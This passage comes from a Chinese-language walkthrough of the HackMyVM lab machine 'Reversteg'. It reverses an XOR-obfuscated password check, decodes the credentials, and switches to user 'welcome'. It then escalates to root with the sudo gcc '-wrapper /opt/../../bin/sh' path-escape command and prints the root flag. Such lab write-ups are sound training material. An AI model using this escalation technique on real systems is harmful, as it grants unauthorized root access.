ass=\"hljs-title function_\"\u003estrcmp\u003c/span\u003e(\u0026#x26;v4[\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e], \u003cspan class=\"hljs-string\"\u003e\"H\"\u003c/span\u003e) )\n        \u003cspan class=\"hljs-keyword\"\u003ebreak\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( ++v20 == \u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e )\n    {\n        \u003cspan class=\"hljs-title function_\"\u003eputs\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Hint: Invert XOR Replace! \"\u003c/span\u003e);\n        goto \u003cspan class=\"hljs-variable constant_\"\u003eLABEL_6\u003c/span\u003e;\n    }\n}\n\u003cspan class=\"hljs-title function_\"\u003estrcpy\u003c/span\u003e(dest, \u0026#x26;v4[\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e]);\n\u003cspan class=\"hljs-title function_\"\u003e__isoc99_scanf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"%s %s %s\"\u003c/span\u003e, v10, \u0026#x26;v9, \u0026#x26;v8);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e提示用户输入密码，或者输入 \"\u003ccode\u003eH\u003c/code\u003e\" 进入所谓的 \"\u003ccode\u003ecoward mode\u003c/code\u003e\"。\u003c/li\u003e\n\u003cli\u003e对用户输入的密码进行处理，并通过 \u003ccode\u003eXOR\u003c/code\u003e 解密和凯撒解密操作生成验证所需的数据。\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003echeck_passwords\u003c/code\u003e 函数验证输入的密码是否正确。\u003c/li\u003e\n\u003cli\u003e如果验证通过，输出成功消息并解密一个隐藏字符串；否则，提示密码错误\u003c/li\u003e\n\u003cli\u003e当用户输入的不是 \"\u003ccode\u003eH\u003c/code\u003e\" 时，假设这是第一个密码，将其复制到 \u003ccode\u003edest\u003c/code\u003e 中。\u003c/li\u003e\n\u003cli\u003e接着，使用 \u003ccode\u003escanf\u003c/code\u003e 读取另外三个字符串，分别存储到 \u003ccode\u003ev10\u003c/code\u003e、\u003ccode\u003ev9\u003c/code\u003e 和 \u003ccode\u003ev8\u003c/code\u003e 中。这可能是验证所需的额外输入\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003eLABEL_6\u003c/span\u003e:\nv7 = \u003cspan class=\"hljs-number\"\u003e8203321\u003c/span\u003e;\n\u003cspan class=\"hljs-title function_\"\u003estrcpy\u003c/span\u003e(v6, \u003cspan class=\"hljs-string\"\u003e\"/, 8:(\"\u003c/span\u003e);\n\u003cspan class=\"hljs-title function_\"\u003estrcpy\u003c/span\u003e((char *)\u0026#x26;v5 + \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"!!|}yx{z\"\u003c/span\u003e);\n\u003cspan class=\"hljs-title function_\"\u003estrcpy\u003c/span\u003e((char *)\u0026#x26;v5, \u003cspan class=\"hljs-string\"\u003e\"(;$)(#\"\u003c/span\u003e);\nv19 = \u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e;\nv18 = (\u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e *)\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e((char *)\u0026#x26;v5 + \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e, 77LL);\nv17 = (\u003cspan class=\"hljs-keyword\"\u003evoid\u003c/span\u003e *)\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e(v6, (unsigned int)v19);\nv16 = (char *)\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e(\u0026#x26;v7, (unsigned int)v19);\nv15 = (char *)\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e(\u0026#x26;v5, (unsigned int)v19);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e初始化数据\u003ccode\u003eXOR\u003c/code\u003e解密，解密\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ev17 = (void *)xor_decrypt(v6, (unsigned int)v19);\u003c/code\u003e == \u003ccode\u003ebamuwe\u003c/code\u003e （眼熟）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMReversteg/image130.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ev15 = (char *)xor_decrypt(\u0026#x26;v5, (unsigned int)v19);\u003c/code\u003e == \u003ccode\u003eeviden\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMReversteg/image131.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ev18 = (void *)xor_decrypt((char *)\u0026#x26;v5 + 7, 77LL);\u003c/code\u003e == \u003ccode\u003ell104567\u003c/code\u003e （群主）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMReversteg/image132.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ev16 = (char *)xor_decrypt(\u0026#x26;v7, (unsigned int)v19);\u003c/code\u003e == \u003ccode\u003eta0\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ev16\u003c/code\u003e不能直接在\u003ccode\u003eCyberChef\u003c/code\u003e里面转，否则会变成乱码，因为\u003ccode\u003ev7\u003c/code\u003e是\u003ccode\u003eint\u003c/code\u003e格式，而\u003ccode\u003e(char *)xor_decrypt\u003c/code\u003e 需要将\u003ccode\u003ev7\u003c/code\u003e转为\u003ccode\u003eSting\u003c/code\u003e格式\u003c/p\u003e\n\u003cp\u003e我们将其代码扒下来，直接打印\u003ccode\u003ev16\u003c/code\u003e ，我们创建\u003ccode\u003ev16.c\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e#include \u0026#x3C;stdio.\u003cspan class=\"hljs-property\"\u003eh\u003c/span\u003e\u003e\n#include \u0026#x3C;stdlib.\u003cspan class=\"hljs-property\"\u003eh\u003c/span\u003e\u003e\n#include \u0026#x3C;string.\u003cspan class=\"hljs-property\"\u003eh\u003c/span\u003e\u003e\n\ntypedef unsigned char _BYTE;\n\n_BYTE *\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e char *a1, char a2\u003c/span\u003e)\n{\n    _BYTE *v3;\n    int v4;\n    int i;\n\n    v4 = \u003cspan class=\"hljs-title function_\"\u003estrlen\u003c/span\u003e(a1);\n    v3 = \u003cspan class=\"hljs-title function_\"\u003emalloc\u003c/span\u003e(v4 + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e; i \u0026#x3C; v4; ++i)\n        v3[i] = a2 ^ a1[i];\n    v3[v4] = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e v3;\n}\n\nint \u003cspan class=\"hljs-title function_\"\u003emain\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e)\n{\n    int v7 = \u003cspan class=\"hljs-number\"\u003e8203321\u003c/span\u003e;\n    char v19 = \u003cspan class=\"hljs-number\"\u003e77\u003c/span\u003e;\n    char *v16;\n\n    v16 = (char *)\u003cspan class=\"hljs-title function_\"\u003exor_decrypt\u003c/span\u003e((\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e char *)\u0026#x26;v7, (unsigned int)v19);\n\n    \u003cspan class=\"hljs-title function_\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"v16 content: %s\\n\"\u003c/span\u003e, v16);\n\n    \u003cspan class=\"hljs-title function_\"\u003efree\u003c/span\u003e(v16);\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后编译并运行，得出\u003ccode\u003ev16\u003c/code\u003e是\u003ccode\u003eta0\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e ⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/reverseteg  vim v16.\u003cspan class=\"hljs-property\"\u003ec\u003c/span\u003e\n ⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/reverseteg  gcc v16.\u003cspan class=\"hljs-property\"\u003ec\u003c/span\u003e -o v16                                       \n ⚡ root@kali  ~\u003cspan class=\"hljs-regexp\"\u003e/Desktop/\u003c/span\u003etest/reverseteg  ./v16    \nv16 \u003cspan class=\"hljs-attr\"\u003econtent\u003c/span\u003e: ta0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e那我们就得出\u003ccode\u003ev15\u003c/code\u003e-\u003ccode\u003ev18\u003c/code\u003e分别是\u003ccode\u003eeviden\u003c/code\u003e 、\u003ccode\u003eta0\u003c/code\u003e 、\u003ccode\u003ebamuwe\u003c/code\u003e 、\u003ccode\u003ell104567\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后程序调用\u003ccode\u003echeckpassword\u003c/code\u003e函数\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( (unsigned int)\u003cspan class=\"hljs-title function_\"\u003echeck_passwords\u003c/span\u003e((int)dest, (int)v10, (int)\u0026#x26;v9, (int)\u0026#x26;v8, (int)v18, (int)v17, v16, v15) )\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后根据参数我们依次输入密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e$ ./reverse\n\u003cspan class=\"hljs-title class_\"\u003eEnter\u003c/span\u003e passwords or \u003cspan class=\"hljs-title class_\"\u003eEnter\u003c/span\u003e H coward \u003cspan class=\"hljs-attr\"\u003emode\u003c/span\u003e:\nll104567\nbamuwe\nta0\neviden\n[+] \u003cspan class=\"hljs-title class_\"\u003eEnter\u003c/span\u003e the password successfully! you \u003cspan class=\"hljs-attr\"\u003eknow\u003c/span\u003e: flower\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003eflower\u003c/code\u003e ？或者\u003ccode\u003ell104567bamuweta0eviden\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e查看\u003ccode\u003e/etc/passwd\u003c/code\u003e下存在哪些用户有\u003ccode\u003eshell\u003c/code\u003e的，用户\u003ccode\u003ewelcome\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e\u003cspan class=\"hljs-attr\"\u003ewelcome\u003c/span\u003e:\u003cspan class=\"hljs-attr\"\u003ex\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e::\u003cspan class=\"hljs-regexp\"\u003e/home/\u003c/span\u003e\u003cspan class=\"hljs-attr\"\u003ewelcome\u003c/span\u003e:\u003cspan class=\"hljs-regexp\"\u003e/bin/\u003c/span\u003esh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换到\u003ccode\u003ewelcome\u003c/code\u003e ，密码是\u003ccode\u003ell104567bamuweta0eviden\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003emorainelake@\u003cspan class=\"hljs-attr\"\u003ereversteg\u003c/span\u003e:~$ su welcome\n\u003cspan class=\"hljs-title class_\"\u003ePassword\u003c/span\u003e: \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e$ /bin/bash\nwelcome@\u003cspan class=\"hljs-attr\"\u003ereversteg\u003c/span\u003e:\u003cspan class=\"hljs-regexp\"\u003e/home/m\u003c/span\u003eorainelake$ sudo -l\n\u003cspan class=\"hljs-title class_\"\u003eMatching\u003c/span\u003e \u003cspan class=\"hljs-title class_\"\u003eDefaults\u003c/span\u003e entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e welcome on \u003cspan class=\"hljs-attr\"\u003ereversteg\u003c/span\u003e:\n    env_reset, mail_badpass, secure_path=\u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003elocal/sbin\\:\u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003elocal/bin\\:\u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003esbin\\:\u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003ebin\\:\u003cspan class=\"hljs-regexp\"\u003e/sbin\\:/\u003c/span\u003ebin\n\n\u003cspan class=\"hljs-title class_\"\u003eUser\u003c/span\u003e welcome may run the following commands on \u003cspan class=\"hljs-attr\"\u003ereversteg\u003c/span\u003e:\n    (\u003cspan class=\"hljs-variable constant_\"\u003eALL\u003c/span\u003e : \u003cspan class=\"hljs-variable constant_\"\u003eALL\u003c/span\u003e) \u003cspan class=\"hljs-attr\"\u003eNOPASSWD\u003c/span\u003e: \u003cspan class=\"hljs-regexp\"\u003e/usr/\u003c/span\u003ebin/gcc -wrapper /opt\u003cspan class=\"hljs-comment\"\u003e/*\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003egcc\u003c/code\u003e提权方案\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003egcc -wrapper /bin/sh,-s .\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e其实\u003ccode\u003e/usr/bin/gcc -wrapper /opt/*\u003c/code\u003e中的\u003ccode\u003e*\u003c/code\u003e是可以逃逸的（群主的思路）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003ewelcome@\u003cspan class=\"hljs-attr\"\u003ereversteg\u003c/span\u003e:\u003cspan class=\"hljs-regexp\"\u003e/opt$ sudo /u\u003c/span\u003esr/bin/gcc -wrapper /opt/../../bin/sh,-s .\n# id\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取\u003ccode\u003eRootFlag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-jsx\"\u003e# cat /root/root.\u003cspan class=\"hljs-property\"\u003etxt\u003c/span\u003e\nflag{4f1eab505b71cd930b0eccd83ff0cfef}\n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - Reversteg","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMReversteg"},"buildId":"PTr9dA1GscQR_NdBVwWnK","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>
